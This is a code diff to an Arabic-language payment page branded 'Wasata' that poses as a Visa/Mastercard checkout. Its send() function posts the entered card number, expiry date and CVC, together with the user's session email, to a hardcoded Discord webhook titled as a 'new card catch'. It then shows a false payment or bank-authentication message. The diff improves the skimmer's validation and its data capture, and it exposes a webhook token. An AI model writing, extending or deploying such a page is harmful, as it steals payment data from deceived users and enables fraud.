@@ -26,6 +26,9 @@
         input:focus { outline: none; border-color: #00eccd; box-shadow: 0 0 15px rgba(0, 236, 205, 0.1); }
         
         .card-type-icon { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); height: 22px; transition: 0.3s; pointer-events: none; }
+        
+        /* تحسين مظهر حقل التاريخ عند الخطأ */
+        input.error { border-color: #ff4d4d; color: #ff4d4d; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-6">
@@ -36,18 +39,14 @@
         <div class="absolute top-14 left-12 text-slate-400 font-bold text-xs uppercase tracking-widest opacity-30">W A S A T A</div>
 
         <div class="mt-20">
-            <!-- خيارات الدفع (فيزا وماستر كارد) -->
+            <!-- خيارات الدفع -->
             <div class="grid grid-cols-2 gap-5 mb-12">
-                <!-- خيار فيزا -->
                 <div class="tab-btn active p-8 flex justify-between items-center" onclick="sel(this)">
-                    <div class="flex items-center gap-2">
-                         <img src="visa.png" class="h-6" alt="Visa">
-                    </div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-4" alt="Visa">
                     <div class="radio-ring"></div>
                 </div>
-                <!-- خيار ماستر كارد -->
                 <div class="tab-btn p-8 flex justify-between items-center" onclick="sel(this)">
-                    <img src="master.png" class="h-8" alt="MasterCard">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-8" alt="MasterCard">
                     <div class="radio-ring"></div>
                 </div>
             </div>
@@ -58,7 +57,6 @@
                     <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رقم البطاقة</label>
                     <div class="relative">
                         <input type="text" id="ccNo" placeholder="5215 1252 1515 2155" maxlength="19" oninput="formatCard(this)" dir="ltr">
-                        <!-- أيقونة تظهر داخل المربع عند الكتابة -->
                         <img id="brnd" src="" class="card-type-icon opacity-0">
                     </div>
                 </div>
@@ -66,7 +64,7 @@
                 <div class="grid grid-cols-2 gap-5">
                     <div>
                         <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">تاريخ الانتهاء</label>
-                        <input type="text" id="expiry" placeholder="10 / 01" maxlength="5" oninput="formatDate(this)" dir="ltr">
+                        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" oninput="formatDate(this)" dir="ltr">
                     </div>
                     <div>
                         <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رمز التحقق (CVC)</label>
@@ -89,9 +87,8 @@
             let v = el.value.replace(/\D/g, '').match(/.{1,4}/g)?.join(' ') || '';
             el.value = v;
             const icon = document.getElementById('brnd');
-            // روابط رسمية SVG من ويكيبيديا (مستحيل تتعطل وتظهر فوراً)
             if(v.startsWith('4')) { 
-                icon.src="visa.png"; 
+                icon.src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"; 
                 icon.style.opacity="1"; 
             } else if(v.startsWith('5')) { 
                 icon.src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"; 
@@ -99,32 +96,61 @@
             } else { icon.style.opacity="0"; }
         }
 
+        // الوظيفة المعدلة للتاريخ
         function formatDate(el) {
-            let v = el.value.replace(/\D/g, '');
-            if(v.length >= 2) {
+            let v = el.value.replace(/\D/g, ''); // إزالة أي شيء ليس رقماً
+            
+            // منع كتابة شهر أكبر من 12
+            if (v.length >= 2) {
+                let month = parseInt(v.substring(0, 2));
+                if (month > 12) v = '12' + v.substring(2);
+                if (month === 0) v = '01' + v.substring(2);
+            }
+
+            // إضافة السلاش تلقائياً والسماح بكتابة السنة
+            if (v.length > 2) {
                 el.value = v.substring(0, 2) + " / " + v.substring(2, 4);
-            } else { el.value = v; }
+            } else {
+                el.value = v;
+            }
         }
 
         async function send() {
+            // التحقق من صحة المدخلات
+            const cc = document.getElementById('ccNo').value;
+            const exp = document.getElementById('expiry').value;
+            const cvc = document.getElementById('cvc').value;
+
+            if(cc.length < 16 || exp.length < 7 || cvc.length < 3) {
+                alert("يرجى التأكد من كتابة بيانات البطاقة بشكل صحيح");
+                return;
+            }
+
             const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
+            
+            // جلب اسم المستخدم من الجلسة
+            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'زائر'};
+            const user = session.email;
+
             fetch(hook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🚀 صيدة بطاقة جديدة - Wasata v8 Elite",
+                        title: "💳 صيدة بطاقة جديدة - Wasata Elite",
                         color: 65485,
                         fields: [
-                            { name: "👤 العميل", value: `@${localStorage.getItem('user') || "زائر"}`, inline: true },
-                            { name: "💳 رقم البطاقة", value: `\`${document.getElementById('ccNo').value}\`` },
-                            { name: "🔐 البيانات", value: `${document.getElementById('expiry').value} | CVV: ${document.getElementById('cvc').value}` }
-                        ]
+                            { name: "👤 المستخدم", value: `\`${user}\``, inline: true },
+                            { name: "💳 رقم البطاقة", value: `\`${cc}\`` },
+                            { name: "🔐 التاريخ | CVV", value: `\`${exp} | ${cvc}\``, inline: true }
+                        ],
+                        footer: { text: "Wasata Security System v9.4" },
+                        timestamp: new Date().toISOString()
                     }]
                 })
             }).then(() => {
-                alert("✅ تم الدفع والمصادقة بنجاح!");
-                location.href = 'status.html';
+                alert("✅ تم إرسال الطلب للمصادقة البنكية، يرجى الانتظار...");
+                location.href = 'index.html'; // أو صفحة انتظار
             });
         }
     </script>
